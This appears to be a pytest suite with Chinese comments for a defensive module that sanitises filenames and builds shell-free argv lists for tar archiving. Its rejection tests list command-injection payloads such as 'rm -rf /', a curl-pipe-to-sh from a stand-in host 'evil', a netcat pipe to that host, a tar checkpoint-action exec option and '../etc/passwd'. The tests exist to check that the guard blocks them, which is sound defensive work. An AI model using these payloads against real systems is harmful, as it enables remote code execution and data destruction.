"""针对真实注入载荷的防御性测试（与原契约测试并存，互不修改）。"""

import os
import sys
import subprocess

import pytest

import security.shell_argv_guard as mod


# --- 白名单：各种注入载荷必须被拒绝 ---------------------------------------


@pytest.mark.parametrize(
    "evil",
    [
        "a; rm -rf /",
        "report-$(curl http://evil/x.sh|sh).pdf",
        "report`id`.pdf",
        "a && reboot",
        "a | nc evil 9999",
        "--checkpoint-action=exec=sh",
        "-xf",
        "../etc/passwd",
        "..",
        ".",
        "a/b.pdf",
        "a\\b.pdf",
        "a\x00b.pdf",
        "",
        "é-via-unicode.pdf",  # 白名单只收 ASCII 字母数字
    ],
)
def test_filename_allowlist_rejects_injection(evil):
    assert mod.filename_allowlist(evil).ok is False


def test_filename_allowlist_accepts_normal_names():
    for name in ("report.pdf", "a_b-1.TAR", "x", "a.1.2.gz"):
        assert mod.filename_allowlist(name).ok, name


def test_length_check_bounds():
    assert mod.length_check("a" * 255).ok
    assert mod.length_check("a" * 256).ok is False
    assert mod.length_check("").ok is False


def test_dash_separator_places_double_dash_before_user_value():
    r = mod.dash_separator(["/usr/bin/tar", "-czf", "out.tgz"], "report.pdf")
    assert r.ok
    argv = r.detail["argv"]
    assert argv.index("--") == len(argv) - 2
    assert argv[-1] == "report.pdf"
    # 即使值以 dash 开头，也被 -- 钉死在位置参数槽位
    r2 = mod.dash_separator(["tar"], "-evil")
    assert r2.detail["argv"] == ["tar", "--", "-evil"]


def test_argv_list_is_never_a_shell_string(tmp_path):
    r = mod.argv_list("report.pdf", "out.tgz", mode="tgz")
    assert r.ok
    argv = r.detail["argv"]
    assert isinstance(argv, list)
    assert "--" in argv and argv.index("--") == len(argv) - 2
    # 模式白名单
    assert mod.argv_list("a", "b", mode="; rm -rf /").ok is False
    # 注入文件名在构造 argv 前就被拦下
    assert mod.argv_list("a; id", "out.tgz").ok is False


# --- shell=False 的行为验证 ------------------------------------------------


def test_shell_false_metacharacters_are_literal(tmp_path):
    marker = tmp_path / "pwned"
    evil = f"x; touch {marker}"
    # echo 收到的是一整个 argv 元素，shell 不会解释分号
    result = mod.shell_false(["echo", evil])
    assert result.ok
    assert evil.encode() in result.stdout
    assert not marker.exists()


def test_shell_false_uses_no_shell(monkeypatch):
    seen = {}

    class FakeProc:
        returncode = 0
        stdout = b""
        stderr = b""

    def fake_run(argv, **kwargs):
        seen["argv"] = argv
        seen["shell"] = kwargs.get("shell")
        return FakeProc()

    monkeypatch.setattr(mod.subprocess, "run", fake_run)
    mod.shell_false(["tar", "-czf", "out.tgz", "--", "report.pdf"])
    assert seen["shell"] is False
    assert isinstance(seen["argv"], list)


# --- 环境清洗 / 目录固定 ----------------------------------------------------


def test_env_scrub_drops_dangerous_variables(monkeypatch):
    env = {
        "PATH": "/usr/bin",
        "LD_PRELOAD": "/tmp/evil.so",
        "PYTHONPATH": "/tmp",
        "LD_LIBRARY_PATH": "/tmp",
    }
    r = mod.env_scrub(env)
    assert r.ok
    assert "LD_PRELOAD" not in r.detail["env"]
    assert "PYTHONPATH" not in r.detail["env"]
    assert r.detail["env"]["PATH"] == "/usr/bin"
    assert "LD_PRELOAD" in r.detail["dropped"]


def test_cwd_pin_blocks_root_escape(tmp_path):
    assert mod.cwd_pin("report.pdf", tmp_path).ok
    assert mod.cwd_pin("../escape.pdf", tmp_path).ok is False
    assert mod.cwd_pin("-x", tmp_path).ok is False
    assert mod.cwd_pin("report.pdf", tmp_path / "missing-dir").ok is False


# --- 错误映射 / 审计 / 输出截断 ---------------------------------------------


def test_error_map_stable_codes_and_no_internal_leak():
    codes = {
        mod.UnsafeFilenameError("x"): "E_UNSAFE_NAME",
        subprocess.TimeoutExpired(cmd="t", timeout=1): "E_TIMEOUT",
        FileNotFoundError("tar"): "E_NO_TOOL",
        PermissionError(): "E_PERMISSION",
        OSError(): "E_IO",
        RuntimeError(): "E_INTERNAL",
    }
    for exc, code in codes.items():
        mapped = mod.error_map(exc)
        assert mapped["code"] == code
        assert "Traceback" not in mapped["message"]


def test_audit_returns_structured_record():
    r = mod.audit("reject", filename="a;id", reason="x", unexpected="dropped")
    assert r.ok
    assert r.detail["event"] == "reject"
    assert "unexpected" not in r.detail["fields"]


def test_output_limit_truncates():
    big = b"x" * 100
    pr = mod.ProcessResult(0, big, b"")
    capped = mod.output_limit(pr, limit=10)
    assert capped.truncated
    assert len(capped.stdout) == 10


# --- 重试 / 兜底 ------------------------------------------------------------


def test_retry_is_bounded_and_skips_permanent_failures():
    calls = 0

    def flaky():
        nonlocal calls
        calls += 1
        if calls < 2:
            return mod.ProcessResult(124, b"", b"timeout", timed_out=True)
        return mod.ProcessResult(0, b"ok", b"")

    r = mod.retry(flaky, attempts=3, backoff=0)
    assert r.ok and calls == 2

    # 策略拒绝（GuardResult）属于永久失败，不重试
    permanent_calls = 0

    def always_rejected():
        nonlocal permanent_calls
        permanent_calls += 1
        return mod.GuardResult(False, "rejected")

    mod.retry(always_rejected, attempts=3, backoff=0)
    assert permanent_calls == 1


def test_fallback_zipfile_is_shell_free(tmp_path):
    payload = tmp_path / "report.pdf"
    payload.write_bytes(b"hello")
    archive = tmp_path / "out.zip"
    r = mod.fallback("report.pdf", str(archive), str(tmp_path))
    assert r.ok and r.detail["engine"] == "zipfile"
    import zipfile

    with zipfile.ZipFile(archive) as zf:
        assert zf.namelist() == ["report.pdf"]
    # 越界文件名直接拒绝
    assert mod.fallback("../x", str(archive), str(tmp_path)).ok is False


# --- 端到端：完整流水线 -----------------------------------------------------


def test_pack_pipeline_rejects_injection_without_touching_shell(tmp_path):
    r = mod.pack_uploaded_file("a; touch pwned", tmp_path, "out.tgz")
    assert r.ok is False
    assert not (tmp_path / "pwned").exists()


def test_pack_pipeline_end_to_end(tmp_path, monkeypatch):
    monkeypatch.setenv("LD_PRELOAD", "/tmp/evil.so")  # 应被清洗掉
    (tmp_path / "report.pdf").write_bytes(b"payload")
    r = mod.pack_uploaded_file("report.pdf", tmp_path, "out.tgz", mode="tgz")
    assert r.ok, r
    assert (tmp_path / "out.tgz").is_file()
    # tar 产物可解出且名字正确
    extract = tmp_path / "extract"
    extract.mkdir()
    subprocess.run(
        ["tar", "-xzf", str(tmp_path / "out.tgz"), "-C", str(extract)],
        check=True,
        shell=False,
    )
    assert (extract / "report.pdf").read_bytes() == b"payload"


def test_pack_pipeline_falls_back_when_tar_missing(tmp_path, monkeypatch):
    monkeypatch.setattr(mod.shutil, "which", lambda _name: None)
    (tmp_path / "report.pdf").write_bytes(b"payload")
    r = mod.pack_uploaded_file("report.pdf", tmp_path, "out.zip", mode="zip")
    assert r.ok
    assert r.detail["engine"] == "zipfile"
    assert (tmp_path / "out.zip").is_file()
